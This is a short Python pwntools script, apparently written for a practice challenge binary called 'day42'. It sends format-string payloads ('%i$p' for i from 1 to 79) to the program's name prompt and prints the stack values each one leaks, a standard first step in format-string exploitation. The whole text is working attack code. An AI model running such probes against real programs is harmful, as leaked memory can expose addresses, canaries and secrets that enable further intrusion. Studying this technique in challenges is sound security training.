from pwn import *

context.binary = "./day42"
context.log_level = "error"

for i in range(1, 80):
	p = process("./day42")
	payload = f"%{i}$p".encode()
	p.recvuntil(b"name: ")
	p.sendline(payload)
	out = p.recvline(timeout = 0.5)

	p.sendline(b"AAAAA")
	print(i, out)
	p.close()
